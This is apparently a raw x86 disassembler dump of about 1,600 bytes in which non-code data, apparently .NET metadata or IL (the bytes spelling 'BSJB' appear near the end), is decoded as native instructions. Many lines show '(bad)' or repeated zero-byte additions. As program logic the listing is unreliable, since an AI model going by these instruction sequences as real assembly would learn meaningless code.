11005ffc:	or     edx,DWORD PTR [esp+ecx*1]
11005fff:	adc    al,0xd
11006001:	jae    0x11006016
11006003:	add    BYTE PTR [eax],al
11006005:	or     dl,BYTE PTR [ebx]
11006007:	add    al,0x14
11006009:	adc    eax,DWORD PTR ds:0x1b28
1100600f:	or     dl,BYTE PTR [ebx]
11006011:	push   es
11006012:	and    BYTE PTR [ebx],al
11006014:	add    BYTE PTR [eax],al
11006016:	add    BYTE PTR [ebx],dl
11006018:	adc    DWORD PTR [eax],edi
1100601a:	push   ebx
1100601b:	(bad)  
1100601c:	(bad)  
1100601d:	(bad)  
1100601e:	cmp    BYTE PTR [ecx],ah
11006020:	(bad)  
11006021:	(bad)  
11006022:	call   DWORD PTR [ecx+edx*1]
11006025:	or     BYTE PTR [edi-0x69],ch
11006028:	add    BYTE PTR [eax],al
1100602a:	or     cl,BYTE PTR [eax]
1100602c:	outs   dx,DWORD PTR ds:[esi]
1100602d:	jno    0x1100602f
1100602f:	add    BYTE PTR [edx],cl
11006031:	push   ss
11006032:	pop    ds
11006033:	inc    eax
11006034:	pop    ss
11006035:	sub    BYTE PTR [edx+0x260a0000],bl
1100603b:	and    BYTE PTR [edx],al
1100603d:	add    BYTE PTR [eax],al
1100603f:	add    BYTE PTR [ebx],dl
11006041:	adc    DWORD PTR [eax],edi
11006043:	sub    bh,dh
11006045:	(bad)  
11006046:	(bad)  
11006047:	cmp    BYTE PTR [esi+edi*8+0x700ffff],ah
1100604e:	outs   dx,DWORD PTR ds:[esi]
1100604f:	xor    al,BYTE PTR [eax]
11006051:	add    BYTE PTR [esi],al
11006053:	adc    al,0x8
11006055:	sub    BYTE PTR [ecx],ah
11006057:	add    BYTE PTR [eax],al
11006059:	push   es
1100605a:	add    BYTE PTR [esi],dl
1100605c:	adc    ecx,DWORD PTR [edi]
1100605e:	and    BYTE PTR [ecx],dl
11006060:	add    BYTE PTR [eax],al
11006062:	add    BYTE PTR [ebx],dl
11006064:	adc    DWORD PTR [eax],edi
11006066:	pop    es
11006067:	(bad)  
11006068:	(bad)  
11006069:	(bad)  
1100606a:	cmp    ch,dh
1100606c:	add    DWORD PTR [eax],eax
1100606e:	add    BYTE PTR [eax],cl
11006070:	sub    BYTE PTR [eax+eax*1],ch
11006073:	add    BYTE PTR [esi],al
11006075:	add    BYTE PTR [esi+0x6],bh
11006078:	add    BYTE PTR [eax],al
1100607a:	add    al,0x16
1100607c:	inc    BYTE PTR [ecx]
1100607e:	adc    edx,DWORD PTR [eax]
11006080:	and    BYTE PTR [eax+eax*1],cl
11006083:	add    BYTE PTR [eax],al
11006085:	adc    edx,DWORD PTR [ecx]
11006087:	cmp    ch,ah
11006089:	std    
1100608a:	(bad)  
1100608b:	call   DWORD PTR [ecx]
1100608d:	adc    BYTE PTR ds:0x200e,ch
11006093:	add    BYTE PTR [eax],al
11006095:	adc    edx,DWORD PTR [ecx]
11006097:	cmp    ch,dl
11006099:	std    
1100609a:	(bad)  
1100609b:	jmp    FWORD PTR [ebx]
1100609d:	scas   al,BYTE PTR es:[edi]
1100609e:	pop    es
1100609f:	adc    DWORD PTR [edx],ecx
110060a1:	adc    DWORD PTR ds:0x6f041109,eax
110060a7:	xor    DWORD PTR [eax],eax
110060a9:	add    BYTE PTR [esi],al
110060ab:	adc    ecx,DWORD PTR [edi]
110060ad:	and    BYTE PTR ds:0x13000000,al
110060b3:	adc    DWORD PTR [eax],edi
110060b5:	mov    eax,0x38fffffd
110060ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
110060bb:	add    DWORD PTR [eax],eax
110060bd:	add    BYTE PTR [eax],al
110060bf:	adc    al,0x13
110060c1:	or     BYTE PTR [esi],dl
110060c3:	adc    ecx,DWORD PTR [ecx]
110060c5:	adc    al,0x13
110060c7:	or     dl,BYTE PTR [ebx+edx*1]
110060ca:	or     edx,DWORD PTR [esi]
110060cc:	adc    ecx,DWORD PTR [eax+eiz*1]
110060cf:	adc    al,BYTE PTR [eax]
110060d1:	add    BYTE PTR [eax],al
110060d3:	adc    edx,DWORD PTR [ecx]
110060d5:	cmp    BYTE PTR [edi+0x2bfffffd],dl
110060db:	inc    ecx
110060dc:	add    BYTE PTR [edx-0x5d],dh
110060df:	add    eax,0xcfe7000
110060e4:	adc    al,BYTE PTR [eax]
110060e6:	sub    BYTE PTR ds:0x6060000,bl
110060ec:	sub    BYTE PTR [ebx+0xa0000],bl
110060f2:	add    BYTE PTR [eax],ah
110060f4:	adc    BYTE PTR [eax],al
110060f6:	add    BYTE PTR [eax],al
110060f8:	adc    edx,DWORD PTR [ecx]
110060fa:	cmp    BYTE PTR [edx-0x3],dh
110060fd:	(bad)  
110060fe:	(bad)  
110060ff:	cmp    dl,dh
11006101:	(bad)  
11006102:	(bad)  
11006103:	inc    DWORD PTR [eax]
11006105:	sub    BYTE PTR [edx],ch
11006107:	add    BYTE PTR [eax],al
11006109:	push   es
1100610a:	or     al,BYTE PTR [eax]
1100610c:	and    BYTE PTR [edi],cl
1100610e:	add    BYTE PTR [eax],al
11006110:	add    BYTE PTR [ebx],dl
11006112:	adc    DWORD PTR [eax],edi
11006114:	pop    ecx
11006115:	std    
11006116:	(bad)  
11006117:	(bad)  
11006118:	cmp    cl,bl
1100611a:	(bad)  
1100611b:	(bad)  
1100611c:	inc    DWORD PTR [eax]
1100611e:	or     BYTE PTR [eax],ch
11006120:	das    
11006121:	add    BYTE PTR [eax],al
11006123:	push   es
11006124:	add    BYTE PTR [ebx],ch
11006126:	add    BYTE PTR [ebx],ch
11006128:	pop    ss
11006129:	adc    DWORD PTR [ecx],edx
1100612b:	inc    ebp
1100612c:	add    al,0x0
1100612e:	add    BYTE PTR [eax],al
11006130:	pop    ebp
11006131:	add    BYTE PTR [eax],al
11006133:	add    BYTE PTR [eax+0x0],al
11006136:	add    BYTE PTR [eax],al
11006138:	xor    eax,DWORD PTR [eax]
1100613a:	add    BYTE PTR [eax],al
1100613c:	dec    esi
1100613d:	add    BYTE PTR [eax],al
1100613f:	add    BYTE PTR [eax],al
11006141:	or     BYTE PTR [edi-0x64],ch
11006144:	add    BYTE PTR [eax],al
11006146:	or     dl,BYTE PTR [ebx]
11006148:	or     ecx,DWORD PTR [eax]
1100614a:	adc    DWORD PTR [ebx],ecx
1100614c:	outs   dx,DWORD PTR ds:[esi]
1100614d:	popf   
1100614e:	add    BYTE PTR [eax],al
11006150:	or     al,BYTE PTR [eax]
11006152:	adc    DWORD PTR [ebx],ecx
11006154:	sub    BYTE PTR [eax],dh
11006156:	add    BYTE PTR [eax],al
11006158:	push   es
11006159:	add    BYTE PTR [eax],cl
1100615b:	outs   dx,DWORD PTR ds:[esi]
1100615c:	sahf   
1100615d:	add    BYTE PTR [eax],al
1100615f:	or     ch,BYTE PTR [edi+0x19]
11006162:	add    BYTE PTR [eax],al
11006164:	or     dl,BYTE PTR [edi]
11006166:	inc    BYTE PTR [edx]
11006168:	adc    edx,DWORD PTR [eax]
1100616a:	and    BYTE PTR [edx],al
1100616c:	add    BYTE PTR [eax],al
1100616e:	add    BYTE PTR [ebx],dl
11006170:	adc    DWORD PTR [ebx],ebp
11006172:	mov    dh,0x11
11006174:	adc    BYTE PTR ds:0x1201c,ch
1100617a:	add    BYTE PTR [eax],al
1100617c:	adc    edx,DWORD PTR [ecx]
1100617e:	sub    ebp,DWORD PTR [ecx+0x1317002b]
11006184:	mov    ebx,cr0
11006187:	add    BYTE PTR [eax],al
11006189:	add    BYTE PTR [ebx],dl
1100618b:	adc    DWORD PTR [ebx],ebp
1100618d:	fst    st(1)
11006190:	add    BYTE PTR [eax],al
11006192:	add    BYTE PTR [eax],al
11006194:	and    BYTE PTR [eax],al
11006196:	add    BYTE PTR [eax],al
11006198:	add    BYTE PTR [ebx],dl
1100619a:	adc    DWORD PTR [ebx],ebp
1100619c:	mov    esi,ds
1100619e:	adc    eax,0x11000d13
110061a3:	or     eax,0x13170813
110061a8:	or     DWORD PTR [eax],eax
110061aa:	fimul  WORD PTR [eax]
110061ac:	add    BYTE PTR es:[edi],dl
110061af:	adc    ecx,DWORD PTR [eax+eax*1]
110061b2:	fiadd  WORD PTR [eax]
110061b4:	add    BYTE PTR [eax],cl
110061b6:	sub    BYTE PTR [esi],ah
110061b8:	add    BYTE PTR [eax],al
110061ba:	push   es
110061bb:	add    BYTE PTR [ecx],dl
110061bd:	add    eax,0x9f6f
110061c2:	or     cl,BYTE PTR ds:0x4110902
110061c8:	sub    BYTE PTR ds:0x13060000,al
110061ce:	or     ch,BYTE PTR [eax]
110061d0:	add    BYTE PTR cs:[eax],al
110061d3:	push   es
110061d4:	add    BYTE PTR [ecx],dl
110061d6:	or     ch,BYTE PTR [eax]
110061d8:	sub    eax,0x60000
110061dd:	add    ch,bl
110061df:	xor    eax,0x13fffffd
110061e4:	push   cs
110061e5:	add    BYTE PTR [ecx],dl
110061e7:	or     BYTE PTR [esi+edi*8],dl
110061ea:	add    DWORD PTR [esi],edx
110061ec:	inc    BYTE PTR [ecx]
110061ee:	adc    edx,DWORD PTR [eax]
110061f0:	adc    DWORD PTR [eax],edx
110061f2:	sub    eax,0x11002b08
110061f7:	push   cs
110061f8:	adc    ecx,DWORD PTR [eax]
110061fa:	sub    eax,DWORD PTR [eax]
110061fc:	add    ch,bl
110061fe:	push   ss
110061ff:	std    
11006200:	(bad)  
11006201:	jmp    DWORD PTR [esi]
11006203:	add    BYTE PTR [edi],dl
11006205:	adc    ecx,DWORD PTR [eax+eax*1]
11006208:	fisttp QWORD PTR [ebx]
1100620a:	std    
1100620b:	(bad)  
1100620c:	call   DWORD PTR [ecx]
1100620e:	or     al,0x16
11006210:	inc    BYTE PTR [ecx]
11006212:	adc    edx,DWORD PTR [eax]
11006214:	and    BYTE PTR [edi],al
11006216:	add    BYTE PTR [eax],al
11006218:	add    BYTE PTR [ebx],dl
1100621a:	adc    DWORD PTR [eax],edi
1100621c:	push   ecx
1100621d:	cld    
1100621e:	(bad)  
1100621f:	call   DWORD PTR [ecx]
11006221:	adc    BYTE PTR [edx],bh
11006223:	dec    eax
11006224:	(bad)  
11006225:	(bad)  
11006226:	jmp    DWORD PTR [eax]
11006228:	push   es
11006229:	add    BYTE PTR [eax],al
1100622b:	add    BYTE PTR [ebx],dl
1100622d:	adc    DWORD PTR [eax],edi
1100622f:	ds cld 
11006231:	(bad)  
11006232:	(bad)  
11006233:	cmp    BYTE PTR [esi+0xfffffd],al
11006239:	adc    DWORD PTR [ecx],ecx
1100623b:	push   ss
1100623c:	inc    BYTE PTR [ecx]
1100623e:	adc    edx,DWORD PTR [eax]
11006240:	and    BYTE PTR [edx],cl
11006242:	add    BYTE PTR [eax],al
11006244:	add    BYTE PTR [ebx],dl
11006246:	adc    DWORD PTR [eax],edi
11006248:	and    eax,0x11fffffc
1100624d:	adc    BYTE PTR [edx],bh
1100624f:	popf   
11006250:	cld    
11006251:	(bad)  
11006252:	jmp    DWORD PTR [eax]
11006254:	add    al,0x0
11006256:	add    BYTE PTR [eax],al
11006258:	adc    edx,DWORD PTR [ecx]
1100625a:	cmp    BYTE PTR [edx],dl
1100625c:	cld    
1100625d:	(bad)  
1100625e:	(bad)  
1100625f:	cmp    BYTE PTR [edi+0xfffffd],bh
11006265:	adc    DWORD PTR [edi],ecx
11006267:	sub    al,BYTE PTR [ecx]
11006269:	dec    esp
1100626a:	add    BYTE PTR [eax],al
1100626c:	add    BYTE PTR [eax],al
1100626e:	in     al,dx
1100626f:	add    BYTE PTR [edx],ah
11006271:	push   cs
11006272:	add    DWORD PTR [ebx],esi
11006274:	cmp    BYTE PTR [eax],al
11006276:	add    BYTE PTR [ecx],al
11006278:	add    BYTE PTR [eax],al
1100627a:	in     al,dx
1100627b:	add    BYTE PTR [edx],ah
1100627d:	inc    ecx
1100627e:	add    DWORD PTR ds:0x1000014,esp
11006284:	add    BYTE PTR [eax],al
11006286:	iret   
11006287:	add    bh,BYTE PTR [eax+0x47]
1100628a:	add    ecx,DWORD PTR ds:0x1000038
11006290:	add    BYTE PTR [eax],al
11006292:	iret   
11006293:	add    bh,BYTE PTR [eax+0x54]
11006296:	add    ecx,DWORD PTR [eax]
11006298:	adc    al,0x0
1100629a:	add    BYTE PTR [ecx],al
1100629c:	add    BYTE PTR [eax],al
1100629e:	lds    eax,FWORD PTR [edx]
110062a0:	(bad)  
110062a1:	mov    eax,DWORD PTR [ebx]
110062a3:	pop    ds
110062a4:	cmp    BYTE PTR [eax],al
110062a6:	add    BYTE PTR [ecx],al
110062a8:	add    BYTE PTR [eax],al
110062aa:	lds    eax,FWORD PTR [edx]
110062ac:	(bad)  
110062ad:	stos   BYTE PTR es:[edi],al
110062ae:	add    ecx,DWORD PTR [ebx]
110062b0:	adc    al,0x0
110062b2:	add    BYTE PTR [ecx],al
110062b4:	add    esi,DWORD PTR [eax]
110062b6:	add    DWORD PTR [eax],eax
110062b8:	push   edi
110062b9:	add    BYTE PTR [eax],al
110062bb:	add    BYTE PTR [eax],al
110062bd:	add    BYTE PTR [eax],al
110062bf:	add    BYTE PTR [edi],dl
110062c1:	sub    eax,DWORD PTR [ebx]
110062c3:	push   ss
110062c4:	sub    eax,DWORD PTR [eax]
110062c6:	sub    al,0x0
110062c8:	add    BYTE PTR [ebx-0x60],dh
110062cb:	add    BYTE PTR [eax],al
110062cd:	or     ch,BYTE PTR [eax]
110062cf:	mov    eax,ds:0xa0000
110062d4:	jae    0x11006278
110062d6:	add    BYTE PTR [eax],al
110062d8:	or     ch,BYTE PTR [eax]
110062da:	mov    eax,ds:0xa0000
110062df:	jae    0x11006284
110062e1:	add    BYTE PTR [eax],al
110062e3:	or     ch,BYTE PTR [eax]
110062e5:	mov    eax,ds:0xa0000
110062ea:	jae    0x11006290
110062ec:	add    BYTE PTR [eax],al
110062ee:	or     ch,BYTE PTR [eax]
110062f0:	mov    eax,ds:0xa0000
110062f5:	jae    0x1100629c
110062f7:	add    BYTE PTR [eax],al
110062f9:	or     ch,BYTE PTR [eax]
110062fb:	mov    eax,ds:0xa0000
11006300:	jae    0x110062a8
11006302:	add    BYTE PTR [eax],al
11006304:	or     ch,BYTE PTR [eax]
11006306:	mov    eax,ds:0xa0000
1100630b:	jae    0x110062b4
1100630d:	add    BYTE PTR [eax],al
1100630f:	or     ch,BYTE PTR [eax]
11006311:	mov    eax,ds:0xa0000
11006316:	sub    al,BYTE PTR [eax]
11006318:	sbb    esi,DWORD PTR [eax]
1100631a:	add    eax,DWORD PTR [eax]
1100631c:	rol    DWORD PTR [ecx],1
1100631e:	add    BYTE PTR [eax],al
11006320:	sbb    BYTE PTR [eax],al
11006322:	add    BYTE PTR [ecx],dl
11006324:	and    BYTE PTR [ebx],al
11006326:	add    BYTE PTR [eax],al
11006328:	add    dh,bh
1100632a:	push   cs
1100632b:	or     BYTE PTR [eax],al
1100632d:	push   ss
1100632e:	adc    eax,DWORD PTR [edi]
11006330:	adc    DWORD PTR [edi],eax
11006332:	inc    ebp
11006333:	add    DWORD PTR [eax],eax
11006335:	add    BYTE PTR [eax],al
11006337:	add    BYTE PTR [eax],al
11006339:	add    BYTE PTR [eax],al
1100633b:	sub    edi,DWORD PTR [ebx]
1100633d:	adc    DWORD PTR [edi],eax
1100633f:	inc    ebp
11006340:	or     eax,0x76000000
11006345:	add    BYTE PTR [eax],al
11006347:	add    BYTE PTR [eax+eax*1],bh
1100634a:	add    BYTE PTR [eax],al
1100634c:	je     0x1100634f
1100634e:	add    BYTE PTR [eax],al
11006350:	scas   al,BYTE PTR es:[edi]
11006351:	add    BYTE PTR [eax],al
11006353:	add    BYTE PTR [ecx+eax*1+0x0],ah
11006357:	add    BYTE PTR [eax+eax*1+0x0],cl
1100635b:	add    BYTE PTR [ebx],dl
1100635d:	add    DWORD PTR [eax],eax
1100635f:	add    BYTE PTR [ecx+eax*1],bh
11006362:	add    BYTE PTR [eax],al
11006364:	dec    ebx
11006365:	add    DWORD PTR [eax],eax
11006367:	add    cl,dh
11006369:	add    BYTE PTR [eax],al
1100636b:	add    BYTE PTR [eax+eax*1+0x610000],bl
11006372:	add    BYTE PTR [eax],al
11006374:	sub    eax,DWORD PTR [ecx]
11006376:	add    BYTE PTR [eax],al
11006378:	add    BYTE PTR [eax],ch
1100637a:	jbe    0x1100637c
1100637c:	add    BYTE PTR [edx],cl
1100637e:	outs   dx,DWORD PTR ds:[esi]
1100637f:	test   al,0x0
11006381:	add    BYTE PTR [edx],cl
11006383:	outs   dx,DWORD PTR ds:[esi]
11006384:	test   eax,0xa0a0000
11006389:	jle    0x11006335
1100638b:	add    BYTE PTR [eax],al
1100638d:	or     dh,BYTE PTR [edx-0x2f]
11006390:	add    eax,0xcfe7000
11006395:	or     BYTE PTR [eax],al
11006397:	sub    BYTE PTR ds:0x6f060000,bl
1100639d:	stos   DWORD PTR es:[edi],eax
1100639e:	add    BYTE PTR [eax],al
110063a0:	or     cl,BYTE PTR [ebx]
110063a2:	pop    es
110063a3:	adc    al,0xfe
110063a5:	add    DWORD PTR [esi],edx
110063a7:	inc    BYTE PTR [ecx]
110063a9:	adc    eax,DWORD PTR [esi]
110063ab:	and    BYTE PTR [ecx],al
110063ad:	add    BYTE PTR [eax],al
110063af:	add    BYTE PTR [ebx],dl
110063b1:	pop    es
110063b2:	sub    ecx,DWORD PTR [ecx+0x3b2d0611]
110063b8:	and    BYTE PTR ds:0x13000000,al
110063be:	pop    es
110063bf:	cmp    BYTE PTR [ecx-0x1],bh
110063c2:	(bad)  
110063c3:	(bad)  
110063c4:	cmp    BYTE PTR [eax+0x0],dl
110063ca:	push   es
110063cb:	adc    eax,DWORD PTR ds:0xb20
110063d1:	add    BYTE PTR [ebx],dl
110063d3:	pop    es
110063d4:	cmp    BYTE PTR [edi+edi*8-0x1],ah
110063d8:	(bad)  
110063d9:	cmp    BYTE PTR [ebx],dl
110063db:	add    DWORD PTR [eax],eax
110063dd:	add    BYTE PTR [eax],al
110063df:	push   es
110063e0:	adc    eax,DWORD PTR ds:0x20
110063e6:	add    BYTE PTR [ebx],dl
110063e8:	pop    es
110063e9:	cmp    BYTE PTR [edi-0x1],cl
110063ec:	(bad)  
110063ed:	(bad)  
110063ee:	cmp    dh,bh
110063f0:	add    BYTE PTR [eax],al
110063f2:	add    BYTE PTR [edi],al
110063f4:	jb     0x11006421
110063f6:	push   es
110063f7:	add    BYTE PTR [eax-0x2],dh
110063fa:	or     al,0x8
110063fc:	add    BYTE PTR [eax],ch
110063fe:	sbb    eax,0x6f060000
11006403:	lods   al,BYTE PTR ds:[esi]
11006404:	add    BYTE PTR [eax],al
11006406:	or     cl,BYTE PTR [eax+eiz*1]
11006409:	or     al,BYTE PTR [eax]
1100640b:	add    BYTE PTR [eax],al
1100640d:	adc    eax,DWORD PTR [edi]
1100640f:	cmp    BYTE PTR [ecx],ch
11006411:	(bad)  
11006412:	(bad)  
11006413:	dec    DWORD PTR [eax]
11006415:	cmp    DWORD PTR [esi+0x20000000],ecx
1100641b:	add    eax,DWORD PTR [eax]
1100641d:	add    BYTE PTR [eax],al
1100641f:	adc    eax,DWORD PTR [edi]
11006421:	cmp    BYTE PTR [edi],dl
11006423:	(bad)  
11006424:	(bad)  
11006425:	(bad)  
11006426:	cmp    BYTE PTR [eax+eax*1+0x9000000],cl
1100642d:	sub    BYTE PTR [ebp+0x130a0000],ch
11006433:	add    al,0x28
11006435:	jbe    0x11006437
11006437:	add    BYTE PTR [edx],cl
11006439:	adc    DWORD PTR [edi+ebp*2],eax
1100643c:	js     0x1100643e
1100643e:	add    BYTE PTR [edx],cl
11006440:	add    BYTE PTR [ecx],dl
11006442:	add    al,0x6f
11006444:	test   eax,0x130a0000
11006449:	add    eax,0xa2dd
1100644e:	add    BYTE PTR [esi],ah
11006450:	add    BYTE PTR [esi],al
11006452:	adc    eax,DWORD PTR ds:0x98dd
11006458:	add    BYTE PTR [eax],al
1100645a:	push   es
1100645b:	adc    eax,DWORD PTR ds:0x920
11006461:	add    BYTE PTR [ebx],dl
11006463:	pop    es
11006464:	cmp    ah,dl
11006466:	(bad)  
11006467:	(bad)  
11006468:	(bad)  
11006469:	cmp    BYTE PTR [ebx+0x8000000],al
1100646f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
11006470:	pop    esp
11006471:	add    BYTE PTR [eax],al
11006473:	add    DWORD PTR ds:0xfefd1f09,ecx
11006479:	add    DWORD PTR [esi],edx
1100647b:	inc    BYTE PTR [ecx]
1100647d:	adc    eax,DWORD PTR [esi]
1100647f:	and    BYTE PTR [esi],al
11006481:	add    BYTE PTR [eax],al
11006483:	add    BYTE PTR [ebx],dl
11006485:	pop    es
11006486:	cmp    BYTE PTR [edx+0x17fffffe],dh
1100648c:	sub    eax,DWORD PTR [ebx]
1100648e:	push   ss
1100648f:	sub    eax,DWORD PTR [eax]
11006491:	sub    al,0x0
11006493:	adc    DWORD PTR [esi],eax
11006495:	sub    eax,0xc2094
1100649a:	add    BYTE PTR [eax],al
1100649c:	adc    eax,DWORD PTR [edi]
1100649e:	cmp    BYTE PTR [edx+0x38fffffe],bl
110064a4:	and    edi,edi
110064a6:	(bad)  
110064a7:	jmp    DWORD PTR [eax]
110064a9:	pop    es
110064aa:	add    BYTE PTR [eax],al
110064ac:	add    BYTE PTR [ebx],dl
110064ae:	pop    es
110064af:	cmp    BYTE PTR [ecx+0x16fffffe],cl
110064b5:	sub    edx,DWORD PTR [edi]
110064b7:	and    BYTE PTR [eax],cl
110064b9:	add    BYTE PTR [eax],al
110064bb:	add    BYTE PTR [ebx],dl
110064bd:	pop    es
110064be:	cmp    BYTE PTR [edx-0x2],bh
110064c1:	(bad)  
110064c2:	dec    DWORD PTR [eax]
110064c4:	jne    0x11006522
110064c6:	add    BYTE PTR [eax],al
110064c8:	add    DWORD PTR [esi+edi*8],edx
110064cb:	add    ebp,DWORD PTR [ebx]
110064cd:	add    BYTE PTR [ebx],dl
110064cf:	push   es
110064d0:	and    BYTE PTR [eax+eax*1],al
110064d3:	add    BYTE PTR [eax],al
110064d5:	adc    eax,DWORD PTR [edi]
110064d7:	cmp    BYTE PTR [ecx-0x2],ah
110064da:	(bad)  
110064db:	call   DWORD PTR [ecx]
110064dd:	push   es
110064de:	sub    eax,0x2208e
110064e3:	add    BYTE PTR [eax],al
110064e5:	adc    eax,DWORD PTR [edi]
110064e7:	cmp    BYTE PTR [ecx-0x2],dl
110064ea:	(bad)  
110064eb:	(bad)  
110064ec:	cmp    ch,ch
110064ee:	(bad)  
110064ef:	(bad)  
110064f0:	inc    DWORD PTR [eax]
110064f2:	adc    DWORD PTR ds:0x2a,eax
110064f8:	add    DWORD PTR [eax],edx
110064fa:	add    BYTE PTR [eax],al
110064fc:	add    BYTE PTR [eax],al
110064fe:	pop    es
110064ff:	add    DWORD PTR [ebx+ebp*1],esp
11006502:	add    DWORD PTR [edx],ecx
11006504:	cmp    BYTE PTR [eax],al
11006506:	add    BYTE PTR [ecx],al
11006508:	adc    esi,DWORD PTR [eax]
1100650a:	add    DWORD PTR [eax],eax
1100650c:	pop    es
1100650d:	add    BYTE PTR [eax],al
1100650f:	add    BYTE PTR ds:0x110000,al
11006515:	pop    ss
11006516:	or     ch,BYTE PTR [ebx]
11006518:	add    BYTE PTR [esi],al
1100651a:	sub    cl,BYTE PTR [edx]
1100651c:	add    BYTE PTR [edx],ch
1100651e:	or     al,BYTE PTR [eax]
11006520:	sub    cl,BYTE PTR [edx]
11006522:	add    BYTE PTR [edx],ch
11006524:	adc    esi,DWORD PTR [eax]
11006526:	add    DWORD PTR [eax],eax
11006528:	dec    ebp
11006529:	add    BYTE PTR [eax],al
1100652b:	add    BYTE PTR [eax],cl
1100652d:	add    BYTE PTR [eax],al
1100652f:	adc    DWORD PTR [ebx],ebp
11006531:	adc    al,BYTE PTR [edi]
11006533:	inc    ebp
11006534:	add    eax,DWORD PTR [eax]
11006536:	add    BYTE PTR [eax],al
11006538:	add    BYTE PTR ss:[eax],al
1100653b:	add    BYTE PTR [ebx],ah
1100653d:	add    BYTE PTR [eax],al
1100653f:	add    BYTE PTR [eax],bl
11006541:	add    BYTE PTR [eax],al
11006543:	add    BYTE PTR [edi],dl
11006545:	sub    eax,DWORD PTR [ebx]
11006547:	push   ss
11006548:	sub    eax,DWORD PTR [eax]
1100654a:	sub    al,0x0
1100654c:	add    BYTE PTR [edx],al
1100654e:	outs   dx,DWORD PTR ds:[esi]
1100654f:	scas   al,BYTE PTR es:[edi]
11006550:	add    BYTE PTR [eax],al
11006552:	or     cl,BYTE PTR [edx]
11006554:	and    BYTE PTR [edx],al
11006556:	add    BYTE PTR [eax],al
11006558:	add    BYTE PTR [ebx],cl
1100655a:	sub    edx,esi
1100655c:	push   es
1100655d:	sub    eax,0x1201d
11006562:	add    BYTE PTR [eax],al
11006564:	or     ebp,DWORD PTR [ebx]
11006566:	retf   
11006567:	sub    eax,DWORD PTR [eax]
11006569:	add    BYTE PTR [edx],al
1100656b:	sub    BYTE PTR [edi],bl
1100656d:	add    BYTE PTR [eax],al
1100656f:	push   es
11006570:	add    BYTE PTR [eax],al
11006572:	and    BYTE PTR [eax],al
11006574:	add    BYTE PTR [eax],al
11006576:	add    BYTE PTR [ebx],cl
11006578:	sub    edi,DWORD PTR [eax+0xa2a002b]
1100657e:	add    BYTE PTR [edx],ch
11006580:	adc    esi,DWORD PTR [eax]
11006582:	add    al,BYTE PTR [eax]
11006584:	adc    DWORD PTR [eax],eax
11006586:	add    BYTE PTR [eax],al
11006588:	add    BYTE PTR [eax],al
1100658a:	add    BYTE PTR [eax],al
1100658c:	add    ch,BYTE PTR [eax]
1100658e:	adc    al,BYTE PTR [eax]
11006590:	add    BYTE PTR [edx],cl
11006592:	add    BYTE PTR [eax],al
11006594:	add    al,BYTE PTR [ebx]
11006596:	jge    0x110065a8
11006598:	add    BYTE PTR [eax],al
1100659a:	add    al,0x0
1100659c:	sub    al,BYTE PTR [eax]
1100659e:	add    BYTE PTR [eax],al
110065a0:	sbb    esi,DWORD PTR [eax]
110065a2:	add    al,BYTE PTR [eax]
110065a4:	xchg   ebp,eax
110065a5:	add    BYTE PTR [eax],al
110065a7:	add    BYTE PTR [ecx],bl
110065a9:	add    BYTE PTR [eax],al
110065ab:	adc    DWORD PTR [ebx],ebp
110065ad:	push   ds
110065ae:	or     DWORD PTR [ebp+0x6],eax
110065b1:	add    BYTE PTR [eax],al
110065b3:	add    BYTE PTR [eax+eax*1],ch
110065b6:	add    BYTE PTR [eax],al
110065b8:	push   eax
110065b9:	add    BYTE PTR [eax],al
110065bb:	add    BYTE PTR [edx],ah
110065bd:	add    BYTE PTR [eax],al
110065bf:	add    BYTE PTR [esi],bh
110065c1:	add    BYTE PTR [eax],al
110065c3:	add    BYTE PTR [ecx+0x0],dh
110065c6:	add    BYTE PTR [eax],al
110065c8:	sldt   WORD PTR [eax]
110065cb:	add    BYTE PTR [eax],al
110065cd:	jae    0x1100657e
110065cf:	add    BYTE PTR [eax],al
110065d1:	or     cl,BYTE PTR [edx]
110065d3:	and    BYTE PTR ds:0xd000000,al
110065d9:	sub    edx,ebx
110065db:	add    ebp,DWORD PTR ds:0x32b1724
110065e1:	push   ss
110065e2:	sub    eax,DWORD PTR [eax]
110065e4:	sub    al,0x0
110065e6:	and    BYTE PTR [edx],al
110065e8:	add    BYTE PTR [eax],al
110065ea:	add    BYTE PTR ds:0x2bc02b,cl
110065f0:	and    BYTE PTR [eax],al
110065f2:	add    BYTE PTR [eax],al
110065f4:	add    BYTE PTR ds:0xe04b62b,cl
110065fa:	add    al,0x73
110065fc:	mov    al,0x0
110065fe:	add    BYTE PTR [edx],cl
11006600:	sub    edx,DWORD PTR [ecx]
11006602:	and    BYTE PTR [ebx],al
11006604:	add    BYTE PTR [eax],al
11006606:	add    BYTE PTR ds:0x504a42b,cl
1100660c:	jae    0x110065bf
1100660e:	add    BYTE PTR [eax],al
11006610:	or     ch,BYTE PTR [ebx]
11006612:	add    BYTE PTR [ebx],cl
11006614:	and    BYTE PTR [ecx],al
11006616:	add    BYTE PTR [eax],al
11006618:	add    BYTE PTR ds:0x2b922b,cl
1100661e:	add    BYTE PTR [esi],al
11006620:	pop    es
11006621:	outs   dx,DWORD PTR ds:[esi]
11006622:	mov    dl,0x0
11006624:	add    BYTE PTR [edx],cl
11006626:	es add dh,bl
11006629:	add    eax,0xde000026
1100662e:	add    BYTE PTR [eax],al
11006630:	push   ss
11006631:	or     al,0x20
11006633:	add    al,0x0
11006635:	add    BYTE PTR [eax],al
11006637:	or     eax,0xffff7138
1100663c:	jmp    FWORD PTR [ebx]
1100663e:	add    BYTE PTR [eax],cl
11006640:	sub    al,BYTE PTR [eax]
11006642:	add    BYTE PTR [eax],al
11006644:	add    DWORD PTR [eax],edx
11006646:	add    BYTE PTR [eax],al
11006648:	add    BYTE PTR [eax],al
1100664a:	jb     0x1100664c
1100664c:	or     al,0x7e
1100664e:	add    BYTE PTR ds:0x100005f,al
11006654:	adc    esi,DWORD PTR [eax]
11006656:	add    DWORD PTR [eax],eax
11006658:	pop    es
11006659:	add    BYTE PTR [eax],al
1100665b:	add    BYTE PTR ds:0x110000,al
11006661:	push   ss
11006662:	or     ch,BYTE PTR [ebx]
11006664:	add    BYTE PTR [esi],al
11006666:	sub    al,BYTE PTR [eax]
11006668:	inc    edx
11006669:	push   ebx
1100666a:	dec    edx
1100666b:	inc    edx
1100666c:	add    DWORD PTR [eax],eax
1100666e:	add    DWORD PTR [eax],eax
11006670:	add    BYTE PTR [eax],al
11006672:	add    BYTE PTR [eax],al
11006674:	or     al,0x0
11006676:	add    BYTE PTR [eax],al
11006678:	jbe    0x110066ae
1100667a:	xor    BYTE PTR cs:[esi],ch
